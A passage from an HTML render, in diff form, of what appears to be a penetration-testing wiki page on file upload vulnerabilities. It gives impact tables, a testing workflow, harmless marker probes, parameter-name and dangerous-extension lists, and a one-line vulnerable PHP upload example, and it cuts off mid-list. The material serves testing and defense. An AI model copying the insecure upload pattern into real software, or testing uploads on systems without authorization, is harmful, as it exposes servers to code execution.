+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#apache-htaccess" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Apache .htaccess
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iis-webconfig" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IIS web.config
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#upload-lfi-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Upload + LFI Chain
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#upload-path-disclosure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Upload + Path Disclosure
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#upload-object-storage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Upload + Object Storage
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#url-based-upload-import" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        URL-Based Upload / Import
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#race-conditions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Race Conditions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#put-upload-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PUT Upload Testing
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#multipart-request-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Multipart Request Manipulation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Multipart Request Manipulation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#change-filename-only" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Change Filename Only
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#change-field-name" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Change Field Name
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#duplicate-file-fields" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Duplicate File Fields
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#duplicate-filename-parameters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Duplicate Filename Parameters
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#utf-8-filename" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        UTF-8 Filename
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#client-side-impact-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Client-Side Impact Files
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Client-Side Impact Files">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stored-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Stored XSS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phishing-trusted-origin-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Phishing / Trusted-Origin Abuse
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#csv-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CSV Injection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#open-redirect-html-smuggling" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Open Redirect / HTML Smuggling
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#malware-social-engineering" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Malware / Social Engineering
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#parser-converter-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Parser / Converter Targets
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#filename-collision-overwrite" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Filename Collision / Overwrite
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#file-size-resource-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        File Size / Resource Testing
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#burp-intruder-wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Burp Intruder Wordlists
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Burp Intruder Wordlists">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#extension-list" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Extension List
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#content-type-list" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Content-Type List
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#filename-mutation-pattern" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Filename Mutation Pattern
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ffuf-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ffuf Testing
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="ffuf Testing">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discover-upload-endpoints" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Discover Upload Endpoints
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-upload-paths" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Upload Paths
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-uploaded-file-path" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Find Uploaded File Path
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#curl-upload-examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        curl Upload Examples
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="curl Upload Examples">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-multipart-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Multipart Upload
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#force-mime-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Force MIME Type
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#custom-filename" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Custom Filename
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#add-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Add Cookie
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#json-base64-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        JSON / Base64 Upload
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fuxploider" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Fuxploider
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#testing-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Testing Checklist
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Testing Checklist">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#validation-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Validation Mapping
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#server-side-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Server-Side Execution
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#client-side-impact" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Client-Side Impact
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#parser-processing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Parser / Processing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#chaining" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Chaining
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#evidence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Evidence
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IDOR/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDOR (Insecure Direct Object Reference)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking & Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Networking & Infrastructure
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Networking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modern Architecture
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modern Architecture
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cloud/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Containers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Containers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Virtualization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virtualization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="file-upload">File Upload</h1>
+<h2 id="introduction">Introduction</h2>
+<p>File Upload vulnerabilities happen when an application lets a user upload a file that can later be abused.</p>
+<p>Impact depends on where the file lands, how it is validated, how it is stored, and how it is later processed.</p>
+<p>Typical impact:</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Meaning</th>
+<th>Typical Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unrestricted Upload</td>
+<td>Dangerous file type accepted</td>
+<td>Web shell, RCE, defacement</td>
+</tr>
+<tr>
+<td>Extension Bypass</td>
+<td>Filter can be bypassed with filename tricks</td>
+<td>Server-side execution</td>
+</tr>
+<tr>
+<td>Content-Type Bypass</td>
+<td>Backend trusts user-controlled MIME header</td>
+<td>Dangerous file accepted</td>
+</tr>
+<tr>
+<td>Magic Byte Bypass</td>
+<td>Backend only checks file header</td>
+<td>Polyglot / fake image upload</td>
+</tr>
+<tr>
+<td>Path Traversal in Upload</td>
+<td>Filename or path controls destination</td>
+<td>Arbitrary file write</td>
+</tr>
+<tr>
+<td>Upload + LFI</td>
+<td>Uploaded file is included later</td>
+<td>RCE through LFI</td>
+</tr>
+<tr>
+<td>Client-Side Payload</td>
+<td>File is served to users</td>
+<td>Stored XSS, HTML injection, phishing</td>
+</tr>
+<tr>
+<td>Parser Exploit</td>
+<td>File is processed by image/PDF/video library</td>
+<td>SSRF, XXE, RCE, metadata leaks</td>
+</tr>
+<tr>
+<td>Archive Abuse</td>
+<td>ZIP/TAR extraction is unsafe</td>
+<td>Zip Slip, overwrite, file planting</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="useful-resources">Useful Resources</h2>
+<ul>
+<li>PortSwigger — File Upload Vulnerabilities</li>
+<li>HackTricks — File Upload</li>
+<li>PayloadsAllTheThings — Upload Insecure Files</li>
+<li>OWASP WSTG — Test Upload of Unexpected File Types</li>
+<li>OWASP WSTG — Test Upload of Malicious Files</li>
+<li>SecLists — Web Content, MIME types, LFI payloads</li>
+<li>Burp Suite — Repeater, Intruder, Logger, Collaborator</li>
+<li>Fuxploider</li>
+<li>ZAP FileUpload add-on</li>
+</ul>
+<hr />
+<h2 id="basic-mental-model">Basic Mental Model</h2>
+<p>Most file upload testing is about answering eight questions:</p>
+<ol>
+<li>Where can I upload files?</li>
+<li>Which field controls the filename?</li>
+<li>Which field controls the destination path?</li>
+<li>Which file types are accepted?</li>
+<li>Is validation based on extension, MIME type, magic bytes, file content, or server-side processing?</li>
+<li>Where is the file stored?</li>
+<li>Can I access the uploaded file directly?</li>
+<li>Is the uploaded file served, parsed, included, converted, extracted, or executed?</li>
+</ol>
+<p>A vulnerable flow often looks like this:</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;uploads/&quot; . $_FILES[&#39;file&#39;][&#39;name&#39;]);</span>
+</span></code></pre></div>
+<p>High-impact condition:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>attacker-controlled file bytes + attacker-controlled filename + web-accessible executable directory
+</span></code></pre></div>
+<hr />
+<h2 id="where-to-test">Where to Test</h2>
+<p>Test every place where the application accepts files or file-like content.</p>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>Examples</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Profile upload</td>
+<td>avatar, logo, profile picture</td>
+</tr>
+<tr>
+<td>Attachments</td>
+<td>tickets, chat, CRM, support case</td>
+</tr>
+<tr>
+<td>CMS/media library</td>
+<td>images, documents, themes</td>
+</tr>
+<tr>
+<td>Import features</td>
+<td>CSV, XML, JSON, Excel, ZIP</td>
+</tr>
+<tr>
+<td>Document generation</td>
+<td>DOCX, PDF, templates</td>
+</tr>
+<tr>
+<td>Image processing</td>
+<td>resize, crop, thumbnail, metadata</td>
+</tr>
+<tr>
+<td>Video/audio processing</td>
+<td>transcoding, preview generation</td>
+</tr>
+<tr>
+<td>Archive upload</td>
+<td>ZIP, TAR, 7Z, plugin/theme package</td>
+</tr>
+<tr>
+<td>API upload</td>
+<td>multipart, base64, presigned URL</td>
+</tr>
+<tr>
+<td>Mobile/API backend</td>
+<td>direct object storage upload</td>
+</tr>
+<tr>
+<td>Admin panels</td>
+<td>plugin upload, theme upload, backup restore</td>
+</tr>
+<tr>
+<td>WYSIWYG editor</td>
+<td>image/file insert</td>
+</tr>
+<tr>
+<td>Markdown/HTML input</td>
+<td>remote image fetch, embedded files</td>
+</tr>
+<tr>
+<td>URL upload</td>
+<td>import from URL, fetch remote file</td>
+</tr>
+<tr>
+<td>PUT endpoints</td>
+<td>WebDAV, REST upload routes</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="high-value-parameter-names">High-Value Parameter Names</h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>file
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>upload
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>image
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>img
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>avatar
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>photo
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>picture
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>logo
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>document
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>doc
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>attachment
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>media
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>import
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>backup
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>restore
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>template
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>theme
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>plugin
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>module
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>filename
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>name
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>path
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>folder
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>dir
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>destination
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>target
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>url
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a>remote
+</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a>data
+</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a>content
+</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a>base64
+</span></code></pre></div>
+<hr />
+<h2 id="baseline-workflow">Baseline Workflow</h2>
+<ol>
+<li>Capture the normal upload request in Burp.</li>
+<li>Upload a harmless text marker first.</li>
+</ol>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>upload_probe_73921
+</span></code></pre></div>
+<ol>
+<li>
+<p>Check the response for:</p>
+</li>
+<li>
+<p>saved filename</p>
+</li>
+<li>public URL</li>
+<li>internal path</li>
+<li>object key</li>
+<li>bucket name</li>
+<li>CDN URL</li>
+<li>image dimensions</li>
+<li>thumbnail URL</li>
+<li>error messages</li>
+<li>extension validation messages</li>
+<li>
+<p>MIME validation messages</p>
+</li>
+<li>
+<p>Visit the uploaded file directly.</p>
+</li>
+<li>
+<p>Check whether the file is:</p>
+</li>
+<li>
+<p>downloaded</p>
+</li>
+<li>rendered inline</li>
+<li>executed</li>
+<li>renamed</li>
+<li>converted</li>
+<li>compressed</li>
+<li>resized</li>
+<li>stripped</li>
+<li>moved</li>
+<li>scanned</li>
+<li>
+<p>deleted</p>
+</li>
+<li>
+<p>Change one property at a time:</p>
+</li>
+<li>
+<p>extension</p>
+</li>
+<li>Content-Type</li>
+<li>magic bytes</li>
+<li>filename characters</li>
+<li>file size</li>
+<li>multipart field name</li>
+<li>path separators</li>
+<li>
+<p>metadata</p>
+</li>
+<li>
+<p>Compare response code, response length, stored name, and later file behavior.</p>
+</li>
+</ol>
+<hr />
+<h2 id="first-probe-files">First Probe Files</h2>
+<h3 id="text-marker">Text Marker</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>upload_probe_73921
+</span></code></pre></div>
+<p>Filename ideas:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>probe.txt
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>probe.jpg
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>probe.png
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>probe.pdf
+</span></code></pre></div>
+<h3 id="minimal-html-probe">Minimal HTML Probe</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>upload_probe_73921<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<p>Filename ideas:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>probe.html
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>probe.htm
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>probe.svg
+</span></code></pre></div>
+<h3 id="svg-probe">SVG Probe</h3>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nt">&lt;svg</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span><span class="nt">&gt;</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span><span class="nt">&lt;text</span><span class="w"> </span><span class="na">x=</span><span class="s">&quot;10&quot;</span><span class="w"> </span><span class="na">y=</span><span class="s">&quot;20&quot;</span><span class="nt">&gt;</span>upload_probe_73921<span class="nt">&lt;/text&gt;</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="nt">&lt;/svg&gt;</span>
+</span></code></pre></div>
+<p>Filename:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>probe.svg
+</span></code></pre></div>
+<h3 id="minimal-valid-png-header-marker">Minimal Valid PNG Header Marker</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\x89PNG\r\n\x1a\nupload_probe_73921&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>probe.png
+</span></code></pre></div>
+<hr />
+<h2 id="upload-response-signals">Upload Response Signals</h2>
+<table>
+<thead>
+<tr>
+<th>Signal</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Original filename preserved</td>
+<td>Filename manipulation may be possible</td>
+</tr>
+<tr>
+<td>Full path leaked</td>
+<td>Useful for LFI/path traversal chaining</td>
+</tr>
+<tr>
+<td>Public URL returned</td>
+<td>Direct access possible</td>
+</tr>
+<tr>
+<td>CDN/object key returned</td>
+<td>Test object storage behavior</td>
+</tr>
+<tr>
+<td>Extension changed</td>
+<td>Backend normalization exists</td>
+</tr>
+<tr>
+<td>Image resized</td>
+<td>Payload may need to survive processing</td>
+</tr>
+<tr>
+<td>File downloaded</td>
+<td>Less likely server-side execution, still useful</td>
+</tr>
+<tr>
+<td>File rendered inline</td>
+<td>Client-side payloads may work</td>
+</tr>
+<tr>
+<td>File executes</td>
+<td>High-impact RCE path</td>
+</tr>
+<tr>
+<td>Same filename overwrites old file</td>
+<td>Overwrite risk</td>
+</tr>
+<tr>
+<td>Path separators accepted</td>
+<td>File write/path traversal risk</td>
+</tr>
+<tr>
+<td>ZIP extracted</td>
+<td>Archive traversal/parser testing</td>
+</tr>
+<tr>
+<td>Async processing</td>
+<td>Race conditions possible</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="dangerous-extensions">Dangerous Extensions</h2>
+<h3 id="php">PHP</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>.php
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>.php3
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>.php4
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>.php5
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>.php7
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>.phtml
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>.pht
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>.phtm
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>.phar
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>.phps
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>.inc
+</span></code></pre></div>
+<h3 id="asp-aspnet-iis">ASP / ASP.NET / IIS</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>.asp
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>.aspx
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>.ashx
